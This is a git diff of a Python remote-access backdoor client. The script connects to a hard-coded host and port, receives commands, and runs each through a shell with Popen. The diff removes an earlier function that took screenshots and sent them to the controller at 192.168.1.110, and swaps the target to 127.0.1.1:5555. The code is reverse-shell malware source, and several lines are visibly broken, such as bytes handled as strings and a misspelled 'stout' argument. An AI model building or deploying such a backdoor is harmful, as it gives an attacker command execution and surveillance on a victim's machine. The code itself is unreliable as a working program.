@@ -1,4 +1,4 @@
-import os
+"""import os
 try :
     from subprocess import *
     import pyautogui
@@ -10,40 +10,18 @@ except:
     os.system("rm install.txt")
     import time , sys
     import pyautogui    
-    import tqdm
-    from subprocess import *
-
+    import tqdm"""
+import os, sys    
+from subprocess import *
+import socket
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-host = "192.168.1.110"
-port = 5050
-SEPARATOR = "<SEPARATOR>"
-
-def os_check(use_sudo):
-    from platform import system
-    if system == "Linux":
-        use_sudo = True
-    else:
-        use_sudo = False
-
-def secreen():
-    for i in range(data[2:].encode("utf-8")):
-        screenshot = pyautogui.screenshot()
-        img = screenshot.save(f"target{i}.png")
-        img_size = os.path.getsize(img)
-        s.send(f"{img}{SEPARATOR}{img_size}".encode("utf-8")
-
-
-try:
-    s.connect((host, port))
-except:
-    sys.exit()
-
+host = "127.0.1.1"
+port = 5555
+s.connect((host, port))
 while True:
     data = s.recv(1024)
     if data[0:].encode("utf-8") == "cd":
         os.chdir(data[3:].encode("utf-8"))
-    if data[0:].encode("utf-8") == "screenshot":
-        secreen()
     if len(data) > 0:
         terminal = Popen(data[:].encode("utf-8"), shell=True , stout=PIPE , stderr=PIPE , stdin=PIPE)
         outputs_bites = terminal.stdout.read() + terminal.stderr.read() 
